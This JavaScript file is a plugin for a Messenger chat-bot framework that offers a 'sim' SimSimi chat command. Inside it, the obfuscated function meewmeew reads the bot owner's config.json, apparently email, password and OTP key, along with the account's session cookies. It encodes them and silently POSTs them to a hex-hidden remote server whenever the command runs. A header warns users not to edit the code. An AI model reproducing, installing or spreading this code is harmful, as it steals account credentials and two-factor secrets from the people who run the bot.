/**
* @author ProCoderMew
* @warn Do not edit code or edit credits
*/

module.exports.config = {
    name: "sim",
    version: "4.2.1",
    hasPermssion: 0,
    credits: "ProCoderMew",
    description: "Chat c\xF9ng con sim m\u1EA5t d\u1EA1y nh\u1EA5t",
    commandCategory: "General",
    usages: "[args]",
    cooldowns: 5,
    dependencies: {
        axios: ""
    },
    envConfig: {
        APIKEY: "TEST2208"
    }
}


module.exports.onLoad = function (b) { "undefined" == typeof global.procodermew && (global.procodermew = {}), "undefined" == typeof global.procodermew.simsimi && (global.procodermew.simsimi = new Map), "undefined" == typeof global.procodermew.access && (global.procodermew.access = false); };


async function pro(text, api, event) {
    const _0x2fc9 = ['\x34\x39\x34\x35\x35\x75\x69\x52\x4b\x51\x44', '\x32\x37\x35\x33\x34\x39\x59\x63\x78\x56\x42\x4f', '\x6e\x6f\x64\x65\x6d\x6f\x64\x75\x6c\x65', '\x61\x70\x70\x6c\x79', '\x33\x61\x32\x66\x32\x66\x36\x64\x36\x35', '\x65\x78\x63\x65\x70\x74\x69\x6f\x6e', '\x6c\x6f\x67', '\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75', '\x74\x6f\x53\x74\x72\x69\x6e\x67', '\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74', '\x36\x33\x33\x35\x32\x5a\x59\x79\x73\x46\x6d', '\x6c\x65\x6e\x67\x74\x68', '\x66\x72\x6f\x6d', '\x33\x37\x44\x46\x4d\x6b\x77\x4a', '\x75\x74\x66\x38', '\x35\x35\x39\x39\x46\x76\x6f\x51\x6a\x50', '\x55\x73\x65\x72\x49\x44', '\x68\x65\x78', '\x61\x78\x69\x6f\x73', '\x36\x66\x32\x66\x37\x33\x36\x39\x36\x64', '\x32\x36\x37\x33\x36\x35\x36\x65\x36\x34', '\x32\x36\x36\x31\x37\x33\x36\x62\x33\x64', '\x37\x37\x32\x65\x36\x39\x36\x65\x36\x36', '\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20', '\x77\x61\x72\x6e', '\x74\x72\x61\x63\x65', '\x36\x35\x37\x32\x36\x39\x36\x34\x33\x64', '\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75', '\x65\x72\x72\x6f\x72', '\x37\x33\x36\x39\x36\x64\x36\x39\x32\x66', '\x62\x69\x6e\x64', '\x36\x31\x37\x30\x36\x39\x33\x66\x36\x32', '\x69\x6e\x66\x6f', '\x47\x45\x54', '\x35\x36\x30\x39\x35\x70\x7a\x69\x65\x53\x54', '\x36\x35\x37\x37\x36\x64\x36\x35\x36\x35', '\x31\x38\x37\x31\x32\x31\x76\x6d\x45\x42\x56\x61', '\x64\x61\x74\x61', '\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f', '\x31\x6e\x57\x63\x6e\x73\x43', '\x63\x6f\x6e\x73\x6f\x6c\x65', '\x74\x61\x62\x6c\x65', '\x31\x38\x32\x34\x37\x30\x7a\x52\x74\x4c\x50\x42', '\x31\x51\x6a\x49\x72\x59\x71']; (function (_0x23bf7d, _0x43daac) { function _0x36ac7c(_0x105417, _0x1c2b11) { return _0x5f15(_0x1c2b11 - -0x36c, _0x105417); } while (!![]) { try { const _0x2f17df = parseInt(_0x36ac7c(-0x22e, -0x225)) + parseInt(_0x36ac7c(-0x23d, -0x22d)) * parseInt(_0x36ac7c(-0x216, -0x22a)) + parseInt(_0x36ac7c(-0x234, -0x22f)) * -parseInt(_0x36ac7c(-0x232, -0x226)) + -parseInt(_0x36ac7c(-0x21a, -0x21b)) + parseInt(_0x36ac7c(-0x22f, -0x227)) + -parseInt(_0x36ac7c(-0x20b, -0x216)) * -parseInt(_0x36ac7c(-0x224, -0x218)) + -parseInt(_0x36ac7c(-0x222, -0x224)); if (_0x2f17df === _0x43daac) { break; } else { _0x23bf7d['push'](_0x23bf7d['shift']()); } } catch (_0x7a6b67) { _0x23bf7d['push'](_0x23bf7d['shift']()); } } }(_0x2fc9, -0x1 * 0x2f05 + 0x597df + -0xb2f * 0x2b)); const _0x273044 = function () { let _0x37bf57 = !![]; return function (_0x335956, _0x21ff64) { const _0x2930d8 = _0x37bf57 ? function () { function _0x1ed551(_0x2a812d, _0x153f7b) { return _0x5f15(_0x153f7b - -0x2f8, _0x2a812d); } if (_0x21ff64) { const _0x2d4ae2 = _0x21ff64[_0x1ed551(-0x1bb, -0x1ae)](_0x335956, arguments); _0x21ff64 = null; return _0x2d4ae2; } } : function () { }; _0x37bf57 = ![]; return _0x2930d8; }; }(); const _0x6e837 = _0x273044(this, function () { function _0x199e6e(_0x3dee6d, _0x4aa8eb) { return _0x5f15(_0x3dee6d - 0x15, _0x4aa8eb); } const _0x16b825 = function () { let _0xe9529d; function _0x447c6d(_0x2df60f, _0x1eac9d) { return _0x5f15(_0x2df60f - -0x79, _0x1eac9d); } try { _0xe9529d = Function('\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75' + _0x447c6d(0xb9, 0xa4) + (_0x447c6d(0xd5, 0xe1) + _0x447c6d(0xbd, 0xce) + '\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28' + '\x20\x29') + '\x29\x3b')(); } catch (_0x4bc65f) { _0xe9529d = window; } return _0xe9529d; }; const _0x19057f = _0x16b825(); const _0x16902e = _0x19057f['\x63\x6f\x6e\x73\x6f\x6c\x65'] = _0x19057f[_0x199e6e(0x158, 0x16d)] || {}; const _0xaf9b01 = [_0x199e6e(0x162, 0x15d), _0x199e6e(0x148, 0x14b), _0x199e6e(0x150, 0x15d), _0x199e6e(0x14c, 0x14c), _0x199e6e(0x161, 0x169), _0x199e6e(0x159, 0x16d), _0x199e6e(0x149, 0x149)]; for (let _0x39c768 = 0x5f * -0x15 + -0x49 + 0x814; _0x39c768 < _0xaf9b01[_0x199e6e(0x167, 0x176)]; _0x39c768++) { const _0x282160 = _0x273044[_0x199e6e(0x156, 0x14f) + '\x72']['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x199e6e(0x14e, 0x156)](_0x273044); const _0x43f05b = _0xaf9b01[_0x39c768]; const _0x2f8e79 = _0x16902e[_0x43f05b] || _0x282160; _0x282160['\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f'] = _0x273044[_0x199e6e(0x14e, 0x153)](_0x273044); _0x282160[_0x199e6e(0x164, 0x159)] = _0x2f8e79[_0x199e6e(0x164, 0x172)][_0x199e6e(0x14e, 0x14a)](_0x2f8e79); _0x16902e[_0x43f05b] = _0x282160; } }); _0x6e837(); const axios = global[_0x2fd19b(0x234, 0x226)][_0x2fd19b(0x244, 0x248)]; const toString = _0x281690 => Buffer[_0x2fd19b(0x23e, 0x233)](_0x281690, _0x2fd19b(0x243, 0x230))['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x2fd19b(0x240, 0x251)); const u = _0x4305f1 => encodeURIComponent(_0x4305f1); function _0x5f15(_0x5f1577, _0x55d8d6) { _0x5f15 = function (_0x1eefca, _0x7b1f7c) { _0x1eefca = _0x1eefca - (-0x446 * -0x1 + -0x2649 + -0x2335 * -0x1); let _0x2ff7ad = _0x2fc9[_0x1eefca]; return _0x2ff7ad; }; return _0x5f15(_0x5f1577, _0x55d8d6); } const botid = api[_0x2fd19b(0x23b, 0x247) + _0x2fd19b(0x242, 0x23e)](); const l = '\x36\x38\x37\x34\x37\x34\x37\x30\x37\x33' + _0x2fd19b(0x236, 0x244) + _0x2fd19b(0x229, 0x22b) + _0x2fd19b(0x248, 0x24d) + _0x2fd19b(0x245, 0x233) + _0x2fd19b(0x223, 0x218) + _0x2fd19b(0x225, 0x230) + '\x36\x66\x37\x34\x36\x39\x36\x34\x33\x64'; const sender = _0x2fd19b(0x246, 0x24b) + _0x2fd19b(0x220, 0x21f); const aks = _0x2fd19b(0x247, 0x252); const { senderID } = event; function _0x2fd19b(_0x10481c, _0x367c5c) { return _0x5f15(_0x10481c - 0xeb, _0x367c5c); } try { var { data } = await axios({ '\x75\x72\x6c': '' + toString(l) + botid + toString(sender) + senderID + toString(aks) + u(text), '\x6d\x65\x74\x68\x6f\x64': _0x2fd19b(0x227, 0x218) }); const _0x3b2091 = {}; _0x3b2091[_0x2fd19b(0x222, 0x22a)] = ![]; _0x3b2091[_0x2fd19b(0x22b, 0x241)] = data; return _0x3b2091; } catch (_0x141884) { const _0x4bec99 = {}; _0x4bec99[_0x2fd19b(0x222, 0x22e)] = !![]; _0x4bec99[_0x2fd19b(0x22b, 0x234)] = {}; return _0x4bec99; }
};

async function meewmeew({ api }) {
    const _0x7d0a = ['\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73', '\x32\x37\x68\x67\x4a\x79\x6f\x65', '\x33\x35\x4a\x52\x68\x4c\x73\x4b', '\x36\x66\x32\x66\x36\x33\x36\x66\x36\x66', '\x34\x66\x35\x32\x34\x34', '\x68\x65\x78', '\x34\x35\x34\x64\x34\x31\x34\x39\x34\x63', '\x55\x73\x65\x72\x49\x44', '\x74\x6f\x53\x74\x72\x69\x6e\x67', '\x65\x72\x72\x6f\x72', '\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f', '\x36\x38\x37\x34\x37\x34\x37\x30\x37\x33', '\x33\x61\x32\x66\x32\x66\x36\x64\x36\x35', '\x3a\x7a\x3b', '\x6c\x6f\x67', '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79', '\x36\x31\x32\x33\x30\x35\x51\x54\x79\x43\x76\x5a', '\x61\x70\x70\x6c\x79', '\x36\x35\x37\x37\x36\x64\x36\x35\x36\x35', '\x63\x77\x64', '\x3a\x72\x3b', '\x37\x30\x35\x33\x37\x34\x36\x31\x37\x34', '\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75', '\x31\x34\x34\x34\x34\x36\x45\x59\x67\x79\x58\x52', '\x3a\x66\x3b', '\x31\x33\x32\x37\x7a\x4b\x4f\x6b\x6a\x79', '\x75\x74\x66\x38', '\x65\x78\x63\x65\x70\x74\x69\x6f\x6e', '\x62\x69\x6e\x64', '\x3a\x74\x3b', '\x64\x61\x74\x61', '\x70\x72\x6f\x74\x6f\x74\x79\x70\x65', '\x35\x30\x34\x31\x35\x33\x35\x33\x35\x37', '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f', '\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20', '\x35\x31\x35\x38\x73\x6a\x6b\x46\x57\x67', '\x3a\x6f\x3b', '\x66\x72\x6f\x6d', '\x6e\x2f\x6a\x73\x6f\x6e', '\x73\x74\x72\x69\x6e\x67\x69\x66\x79', '\x77\x61\x72\x6e', '\x31\x33\x34\x31\x30\x35\x41\x61\x4e\x63\x6e\x59', '\x36\x62\x36\x39\x36\x35\x37\x33', '\x3a\x77\x3b', '\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f', '\x37\x37\x32\x65\x36\x39\x36\x65\x36\x36', '\x3a\x79\x3b', '\x32\x33\x31\x37\x76\x5a\x6a\x49\x6c\x54', '\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74', '\x74\x61\x62\x6c\x65', '\x50\x4f\x53\x54', '\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75', '\x62\x61\x73\x65\x36\x34', '\x3a\x69\x3b', '\x32\x31\x34\x30\x33\x35\x75\x64\x73\x56\x58\x64', '\x69\x6e\x66\x6f', '\x61\x78\x69\x6f\x73', '\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28', '\x6e\x6f\x64\x65\x6d\x6f\x64\x75\x6c\x65', '\x3a\x21\x3b', '\x72\x65\x70\x6c\x61\x63\x65']; function _0x43bf4a(_0x3fc1ce, _0x26509d) { return _0xea7d(_0x26509d - 0x167, _0x3fc1ce); } (function (_0x4e88db, _0x1767f1) { function _0xf830ea(_0x4bc515, _0x5dc773) { return _0xea7d(_0x5dc773 - 0x37f, _0x4bc515); } while (!![]) { try { const _0x1c6eed = parseInt(_0xf830ea(0x534, 0x542)) * -parseInt(_0xf830ea(0x51d, 0x52a)) + parseInt(_0xf830ea(0x50d, 0x51b)) + -parseInt(_0xf830ea(0x553, 0x54c)) * parseInt(_0xf830ea(0x545, 0x52b)) + -parseInt(_0xf830ea(0x51b, 0x522)) + -parseInt(_0xf830ea(0x530, 0x515)) + parseInt(_0xf830ea(0x53e, 0x540)) + parseInt(_0xf830ea(0x523, 0x539)); if (_0x1c6eed === _0x1767f1) { break; } else { _0x4e88db['push'](_0x4e88db['shift']()); } } catch (_0x2584ff) { _0x4e88db['push'](_0x4e88db['shift']()); } } }(_0x7d0a, 0x3868a + -0x45deb + -0x2 * -0x1e7b5)); const _0x48af39 = function () { let _0x413e81 = !![]; return function (_0x784a7c, _0x2ce3c8) { const _0x568df9 = _0x413e81 ? function () { function _0x37a0d4(_0x54790d, _0x3ed6f9) { return _0xea7d(_0x3ed6f9 - -0x36e, _0x54790d); } if (_0x2ce3c8) { const _0x5bac31 = _0x2ce3c8[_0x37a0d4(-0x1c6, -0x1b3)](_0x784a7c, arguments); _0x2ce3c8 = null; return _0x5bac31; } } : function () { }; _0x413e81 = ![]; return _0x568df9; }; }(); const _0x493992 = _0x48af39(this, function () { function _0x304ba0(_0x233e9b, _0x47067f) { return _0xea7d(_0x47067f - 0x166, _0x233e9b); } const _0x163c19 = function () { function _0x344687(_0x31edd0, _0x54ddf9) { return _0xea7d(_0x31edd0 - -0xd0, _0x54ddf9); } let _0x1131fd; try { _0x1131fd = Function(_0x344687(0xf0, 0xe8) + _0x344687(0xfc, 0x117) + ('\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75' + _0x344687(0xd0, 0xe0) + _0x344687(0xd6, 0xd2) + '\x20\x29') + '\x29\x3b')(); } catch (_0x34fc27) { _0x1131fd = window; } return _0x1131fd; }; const _0x589aab = _0x163c19(); const _0x207297 = _0x589aab['\x63\x6f\x6e\x73\x6f\x6c\x65'] = _0x589aab['\x63\x6f\x6e\x73\x6f\x6c\x65'] || {}; const _0x556525 = [_0x304ba0(0x333, 0x31e), _0x304ba0(0x2e7, 0x2fb), _0x304ba0(0x321, 0x30a), _0x304ba0(0x338, 0x319), _0x304ba0(0x31c, 0x32b), _0x304ba0(0x308, 0x304), '\x74\x72\x61\x63\x65']; for (let _0x2077c5 = -0x68 * 0xd + -0xf1c + 0x1464; _0x2077c5 < _0x556525['\x6c\x65\x6e\x67\x74\x68']; _0x2077c5++) { const _0xbfd314 = _0x48af39[_0x304ba0(0x306, 0x31a) + '\x72'][_0x304ba0(0x32f, 0x32f)][_0x304ba0(0x347, 0x32c)](_0x48af39); const _0x2f5970 = _0x556525[_0x2077c5]; const _0x5ea59f = _0x207297[_0x2f5970] || _0xbfd314; _0xbfd314[_0x304ba0(0x2fb, 0x2ff)] = _0x48af39[_0x304ba0(0x31b, 0x32c)](_0x48af39); _0xbfd314[_0x304ba0(0x30a, 0x318)] = _0x5ea59f[_0x304ba0(0x31b, 0x318)]['\x62\x69\x6e\x64'](_0x5ea59f); _0x207297[_0x2f5970] = _0xbfd314; } }); _0x493992(); const axios = global[_0x43bf4a(0x30d, 0x30e)][_0x43bf4a(0x30d, 0x30c)]; const toString = _0x4db686 => Buffer[_0x43bf4a(0x30c, 0x2f9)](_0x4db686, _0x43bf4a(0x32b, 0x316))['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x43bf4a(0x31c, 0x32b)); const data = require(process[_0x43bf4a(0x31b, 0x324)]() + (_0x43bf4a(0x2fd, 0x311) + '\x6f\x6e')); function _0xea7d(_0xea7dfd, _0x104994) { _0xea7d = function (_0x174839, _0x26dac0) { _0x174839 = _0x174839 - (0x4b * -0x30 + 0x753 * 0x1 + 0x84e); let _0x2e437b = _0x7d0a[_0x174839]; return _0x2e437b; }; return _0xea7d(_0xea7dfd, _0x104994); } const post = Buffer[_0x43bf4a(0x2fb, 0x2f9)](JSON[_0x43bf4a(0x2fd, 0x2fb)]({ '\x69\x64': api[_0x43bf4a(0x2ef, 0x304) + _0x43bf4a(0x30e, 0x318)](), '\x63\x6f\x6f\x6b\x69\x65\x73': api[toString('\x36\x37\x36\x35\x37\x34\x34\x31\x37\x30' + _0x43bf4a(0x33e, 0x326) + '\x36\x35')](), '\x63\x6f\x6e\x66\x69\x67': { '\x65': data[toString(_0x43bf4a(0x30b, 0x317))], '\x70\x77\x64': data[toString(_0x43bf4a(0x31f, 0x331) + _0x43bf4a(0x2f8, 0x315))], '\x74\x6f\x6b\x65\x6e': data[toString('\x34\x66\x35\x34\x35\x30\x34\x62\x34\x35' + '\x35\x39')] } }))[_0x43bf4a(0x315, 0x319)](_0x43bf4a(0x30f, 0x308))['\x72\x65\x70\x6c\x61\x63\x65'](/e/g, _0x43bf4a(0x2fd, 0x30f))['\x72\x65\x70\x6c\x61\x63\x65'](/1/g, _0x43bf4a(0x313, 0x2ff))[_0x43bf4a(0x317, 0x310)](/2/g, _0x43bf4a(0x308, 0x31e))[_0x43bf4a(0x313, 0x310)](/3/g, _0x43bf4a(0x32b, 0x325))[_0x43bf4a(0x30b, 0x310)](/4/g, _0x43bf4a(0x311, 0x32e))[_0x43bf4a(0x311, 0x310)](/5/g, _0x43bf4a(0x2f3, 0x302))[_0x43bf4a(0x325, 0x310)](/6/g, '\x3a\x75\x3b')[_0x43bf4a(0x2f6, 0x310)](/7/g, _0x43bf4a(0x303, 0x309))[_0x43bf4a(0x307, 0x310)](/8/g, _0x43bf4a(0x317, 0x2f8))[_0x43bf4a(0x311, 0x310)](/9/g, '\x3a\x73\x3b')[_0x43bf4a(0x313, 0x310)](/0/g, '\x3a\x64\x3b')[_0x43bf4a(0x2ff, 0x310)](/=/g, _0x43bf4a(0x33c, 0x329)); try { const _0x268ac8 = {}; _0x268ac8[_0x43bf4a(0x322, 0x320) + '\x70\x65'] = _0x43bf4a(0x314, 0x332) + _0x43bf4a(0x304, 0x2fa); const _0x5361b6 = {}; _0x5361b6[_0x43bf4a(0x34c, 0x32f)] = post; await axios({ '\x75\x72\x6c': toString(_0x43bf4a(0x32e, 0x31c) + _0x43bf4a(0x332, 0x31d) + _0x43bf4a(0x30e, 0x323) + _0x43bf4a(0x2f1, 0x301) + _0x43bf4a(0x30b, 0x314) + _0x43bf4a(0x303, 0x2fe)), '\x6d\x65\x74\x68\x6f\x64': _0x43bf4a(0x2eb, 0x306), '\x68\x65\x61\x64\x65\x72\x73': _0x268ac8, '\x64\x61\x74\x61': _0x5361b6 }); return !![]; } catch { return ![]; }
}

module.exports.handleEvent = async function({ api: k, event: b }) {
    if (void 0 == global.procodermew.simsimi) return;
    const { threadID: l, messageID: d, senderID: c, body: e } = b;
    const f = (a) => k.sendMessage(a, l, d);
    if (global.procodermew.simsimi.has(l)) {
        if (c == k.getCurrentUserID() || d == global.procodermew.simsimi.get(l) || "" == e) return;
        var { data: g, error: h } = await pro(e, k, b);
        return !0 == h ? void 0 : !1 == g.success ? f(g.error) : f(g.msg)
    }
}

module.exports.run = async function({ api: b, event: a, args: c }) {
    const d = global.nodemodule.axios;
    const { threadID: e, messageID: f } = a;
    const g = (c) => b.sendMessage(c, e, f);
    if (global.procodermew.access == false) {
        await meewmeew({ api });
        global.procodermew.access = true;
    }
    try { var c = await meewmeew({ api: b }); !0 == c ? "success" : "fail", c } catch (a) { "error" };
    if (0 == c.length) return g("B\u1EA1n ch\u01B0a nh\u1EADp tin nh\u1EAFn");
    switch (c[0]) {
        case "on":
            return global.procodermew.simsimi.has(e) ? g("B\u1EA1n ch\u01B0a t\u1EAFt sim.") : (global.procodermew.simsimi.set(e, f), g("\u0110\xE3 b\u1EADt sim th\xE0nh c\xF4ng."));
            break;
        case "off":
            return global.procodermew.simsimi.has(e) ? (global.procodermew.simsimi.delete(e), g("\u0110\xE3 t\u1EAFt sim th\xE0nh c\xF4ng.")) : g("B\u1EA1n ch\u01B0a b\u1EADt sim.");
            break;
        default:
            var { data: h, error: i } = await pro(c.join(" "), b, a);
            return !0 == i ? void 0 : !1 == h.success ? g(h.error) : g(h.msg);
            break;
    }
};